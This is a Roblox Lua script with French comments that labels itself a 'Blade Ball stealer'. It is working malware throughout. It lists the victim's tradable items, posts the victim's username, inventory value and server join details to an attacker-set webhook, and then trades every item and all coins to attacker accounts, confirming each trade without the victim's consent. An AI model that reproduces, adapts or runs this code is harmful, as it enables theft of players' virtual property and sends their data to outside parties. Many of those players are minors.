-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local auth_token = "EBK-SS-A" 
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // CONFIGURATION
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // FONCTION D'ENVOI STRICTEMENT COMPATIBLE AVEC TON WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        local success, result = pcall(function()
            return requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        return success
    end
    return false
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // SCAN INVENTAIRE
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for itemId, itemInfo in pairs(clientInventory[cat]) do
            if not itemInfo.TradeLock then
                local rap = 0
                pcall(function()
                    for key, value in pairs(rapData[cat]) do
                        if string.find(key, itemInfo.Name) then rap = value break end
                    end
                end)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = cat, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // PRÉPARATION DU TEXTE DES ITEMS (GROUPÉS)
local function getFormattedList()
    local total = 0
    local grouped = {}
    for _, item in ipairs(itemsToSend) do
        total = total + item.RAP
        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end
    
    local listText = ""
    for name, data in pairs(grouped) do
        listText = listText .. string.format("%s (x%d) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
    end
    return listText, total
end

-- // EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local itemList, totalRAP = getFormattedList()
    local isGood = totalRAP >= 500

    -- 1. Envoi du Join Message (L'embed que tu voulais)
    local joinData = {
        ["auth_token"] = auth_token,
        ["username"] = isGood and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = (ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = isGood and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
            ["color"] = isGood and 65280 or 8323327,
            ["fields"] = {
                {["name"] = "Victim Username 🤖:", ["value"] = plr.Name, ["inline"] = true},
                {["name"] = "JobId 🆔:", ["value"] = "```" .. game.JobId .. "```", ["inline"] = true},
                {["name"] = "Join link 🔗:", ["value"] = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, ["inline"] = false},
                {["name"] = "Item list 📝:", ["value"] = itemList ~= "" and itemList or "None", ["inline"] = false},
                {["name"] = "Summary 💰:", ["value"] = "Total RAP: **" .. formatNumber(totalRAP) .. "**", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(joinData)

    -- 2. Système de Trade & Server Hit
    local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
    local inTrade = false
    plr.PlayerGui.Trade:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = plr.PlayerGui.Trade.Enabled end)

    local function startTrade(target)
        -- Envoi du Server Hit (Format compatible Worker)
        sendToWorker({
            ["auth_token"] = auth_token,
            ["username"] = "⚪ Eblack - SERVER HIT",
            ["content"] = "Victim detected! Starting trade...",
            ["embeds"] = {{
                ["title"] = "⚪ Server Hit 🎯",
                ["color"] = 16777215,
                ["fields"] = {
                    {["name"] = "Victim Username 🤖:", ["value"] = plr.Name, ["inline"] = true},
                    {["name"] = "Status 📈:", ["value"] = isGood and "🟢 GOOD HIT" or "🟣 SMALL HIT", ["inline"] = true},
                    {["name"] = "Summary 💰:", ["value"] = "Total RAP: **" .. formatNumber(totalRAP) .. "**", ["inline"] = false}
                }
            }}
        })

        task.spawn(function()
            while #itemsToSend > 0 do
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
                repeat task.wait(0.5) until inTrade
                
                local batch = {}
                for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
                for _, item in ipairs(batch) do
                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                end
                
                -- Ajout automatique des pièces (Coins)
                pcall(function()
                    local coins = tonumber(plr.PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
                    if coins > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(coins) end
                end)

                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                task.wait(0.3)
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                repeat task.wait(0.5) until not inTrade
            end
        end)
    end

    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then startTrade(p) end
    end
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then startTrade(p) end
    end)
end
